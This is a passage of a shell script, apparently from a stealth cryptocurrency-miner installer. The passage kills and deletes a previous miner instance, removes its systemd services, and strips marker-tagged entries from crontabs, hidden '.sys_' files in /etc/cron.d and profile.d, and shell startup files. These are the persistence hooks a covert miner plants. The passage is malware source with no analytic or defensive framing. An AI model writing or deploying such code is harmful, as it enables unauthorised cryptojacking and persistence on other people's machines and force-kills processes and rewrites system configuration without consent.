...
# ===== KILL PREVIOUS INSTANCE (anti-duplicate) =====
MARKER_FILE="$HOME/.cache/.miner_instance"
if [ -f "$MARKER_FILE" ]; then
    OLD_WD=$(cat "$MARKER_FILE" 2>/dev/null | head -1)
    OLD_SVC=$(cat "$MARKER_FILE" 2>/dev/null | sed -n '2p')
    OLD_MARKER=$(cat "$MARKER_FILE" 2>/dev/null | sed -n '3p')
    if [ -n "$OLD_WD" ] && [ -d "$OLD_WD" ]; then
        # Kill all processes running from old workdir
        pgrep -f "$OLD_WD" 2>/dev/null | xargs kill -9 2>/dev/null || true
        sleep 0.3
        # Hapus workdir lama
        rm -rf "$OLD_WD" 2>/dev/null || true
    fi
    # Stop & disable old systemd service
    if [ -n "$OLD_SVC" ]; then
        systemctl --user stop "$OLD_SVC" 2>/dev/null || systemctl stop "$OLD_SVC" 2>/dev/null || true
        systemctl --user disable "$OLD_SVC" 2>/dev/null || systemctl disable "$OLD_SVC" 2>/dev/null || true
        rm -f "$HOME/.config/systemd/user/${OLD_SVC}.service" 2>/dev/null || true
        rm -f "/etc/systemd/system/${OLD_SVC}.service" 2>/dev/null || true
        systemctl --user daemon-reload 2>/dev/null || systemctl daemon-reload 2>/dev/null || true
    fi
    # Clean old cron & rc hooks by marker
    if [ -n "$OLD_MARKER" ]; then
        command -v crontab >/dev/null 2>&1 && { crontab -l 2>/dev/null | grep -v "$OLD_MARKER" | crontab - 2>/dev/null || true; }
        rm -f "/etc/cron.d/.sys_${OLD_MARKER}" 2>/dev/null || true
        [ -f /etc/crontab ] && [ -w /etc/crontab ] && grep -v "$OLD_MARKER" /etc/crontab > /etc/crontab.tmp 2>/dev/null && mv /etc/crontab.tmp /etc/crontab 2>/dev/null || true
        for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
            [ -f "$rc" ] && grep -q "$OLD_MARKER" "$rc" 2>/dev/null && { grep -v "$OLD_MARKER" "$rc" > "${rc}.tmp" 2>/dev/null && mv "${rc}.tmp" "$rc" 2>/dev/null || true; }
        done
        rm -f /etc/profile.d/.sys_${OLD_MARKER}.sh 2>/dev/null || true
    fi
